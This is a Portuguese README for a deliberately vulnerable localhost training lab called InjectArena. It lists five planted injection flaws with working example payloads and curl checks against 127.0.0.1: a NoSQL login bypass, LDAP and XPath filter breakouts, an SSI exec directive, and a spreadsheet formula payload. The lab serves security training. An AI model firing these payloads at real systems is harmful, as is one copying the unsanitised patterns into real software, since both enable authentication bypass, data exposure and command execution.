# InjectArena (Lab 09)

> **VULNERÁVEL DE PROPÓSITO — somente localhost.** Esta aplicação existe para ser
> explorada em treino de segurança. Todo endpoint contém um bug de injeção
> plantado de propósito. O bind é só `127.0.0.1:18809`. Todos os segredos/salários
> são valores de **marcador** (não reais). **Não** publique isto em nenhum lugar
> alcançável.

## O que é

O InjectArena é um "campo de tiro de injeção": um arquivo Python único, só com a
biblioteca padrão (`http.server` + `json` + `re` + `xml.etree`) em que cada
endpoint **simula uma linguagem de consulta de backend diferente** e é injetável.
Nenhum MongoDB / LDAP / XPath / SSI / motor de planilha real é necessário — os
backends são simulados de forma fiel o bastante para as injeções mudarem de fato
o comportamento, então você confirma cada uma com `curl`.

## Como rodar

```bash
python app.py
# -> [InjectArena] escutando em http://127.0.0.1:18809/
```

Depois navegue em `http://127.0.0.1:18809/` para um índice descobrível da
superfície de ataque, ou acesse os endpoints diretamente (veja a tabela abaixo).

## Usuários de semente (em memória)

| username | password         | email                     | salary  | role     | secret (marcador)           |
|----------|------------------|---------------------------|---------|----------|-----------------------------|
| admin    | `S3cr3t-Admin!`  | admin@injectarena.local   | 999000  | admin    | PLACEHOLDER-FLAG-admin-7f3a |
| alice    | `alicepass123`   | alice@injectarena.local   | 82000   | engineer | PLACEHOLDER-FLAG-alice-2b9c |
| bob      | `bobby-bob`      | bob@injectarena.local     | 64000   | support  | PLACEHOLDER-FLAG-bob-1d4e   |
| carol    | `carolSecure!!`  | carol@injectarena.local   | 120000  | manager  | PLACEHOLDER-FLAG-carol-9a0f |

As linhas de feedback (para N5) começam vazias e acumulam via `POST /feedback`.

## Vulnerabilidades plantadas

| ID | Nome | Rota | Exemplo de payload de injeção | Impacto |
|----|------|------|-------------------------------|---------|
| **N1** | Injeção de NoSQL (MongoDB) | `POST /login` (corpo JSON) | `{"username":"admin","password":{"$ne":null}}` | Desvio de autenticação — o objeto de operador casa com qualquer senha não nula; entre como admin sem a senha. |
| **N2** | Injeção de LDAP | `GET /directory?user=` | `user=*)(uid=*))(|(uid=*` (ou `user=*`) | Quebra do filtro — o filtro concatenado `(&(objectClass=person)(uid=...))` se abre e devolve **todas** as entradas do diretório. |
| **N3** | Injeção de XPath | `GET /employee?name=` | `name=x' or '1'='1` | Quebra por tautologia do literal de string em `//employee[name='...']` — o predicado é sempre verdadeiro, despejando **todos** os funcionários, inclusive salário/segredo. |
| **N4** | Injeção de SSI (server-side includes) | `GET /greet?name=` | `name=<!--#exec cmd="whoami"-->` | A diretiva SSI injetada no nome é **processada** pelo servidor (não impressa literalmente) — `exec cmd` roda um comando da lista de permissão (primitiva de RCE); comandos fora da lista são interceptados mas ainda mostrados como processados. |
| **N5** | Injeção de CSV / fórmula | `POST /feedback` → `GET /export` | feedback `name==1+1` (ou `=cmd|'/c calc'!A1`) | O valor armazenado é escrito numa célula CSV **sem** sanitização de prefixo de fórmula (`= + - @ TAB CR`), então vira uma fórmula viva quando a exportação é aberta no Excel/Sheets. |

## Verificação rápida

```bash
# N1 - desvio de autenticação NoSQL (devolve authenticated:true, admin)
curl -s -d '{"username":"admin","password":{"$ne":null}}' http://127.0.0.1:18809/login
#   ...e uma senha errada em string falha:
curl -s -d '{"username":"admin","password":"wrong"}' http://127.0.0.1:18809/login

# N2 - quebra do filtro LDAP (todos os usuários vs um)
curl -s 'http://127.0.0.1:18809/directory?user=*)(uid=*))(|(uid=*'
curl -s 'http://127.0.0.1:18809/directory?user=alice'

# N3 - tautologia de XPath (todos os funcionários vs um)
curl -s "http://127.0.0.1:18809/employee?name=x' or '1'='1"
curl -s 'http://127.0.0.1:18809/employee?name=Alice'

# N4 - diretiva SSI processada (saída de whoami, não a diretiva literal)
curl -s 'http://127.0.0.1:18809/greet?name=<!--#exec cmd="whoami"-->'

# N5 - injeção de CSV/fórmula (célula começando com =1+1, sem escape)
curl -s -d 'name==1+1&comment=hi' http://127.0.0.1:18809/feedback
curl -s http://127.0.0.1:18809/export
```

## Notas sobre a simulação

- **N1** casa operadores do Mongo (`$ne`, `$gt`, `$gte`, `$lt`, `$lte`, `$regex`,
  `$in`, `$nin`, `$exists`, `$eq`) quando o valor de um campo é um objeto JSON;
  uma string/número simples é comparada por igualdade exata (o caminho seguro).
- **N2** interpreta um filtro no estilo RFC-4515; filtros desbalanceados/injetados
  degradam para casar tudo, o que é o próprio sinal da injeção. O filtro bruto
  montado é ecoado na resposta.
- **N3** mantém os usuários como um documento `xml.etree`; o XPath concatenado é
  ecoado e um padrão de tautologia força um predicado sempre verdadeiro.
- **N4** só executa de fato uma lista de permissão somente leitura (`whoami`,
  `hostname`, `id`, `echo`, `ver`) por segurança; qualquer outra coisa é refletida
  como `[ssi] directive processed (cmd intercepted for lab safety): <X>`. O ponto
  é que a diretiva é *processada no servidor*, comprovando a injeção de SSI.
- **N5** mantém um mínimo de aspas de CSV mas nunca neutraliza os prefixos de
  fórmula, então a célula exportada começa com o caractere perigoso.
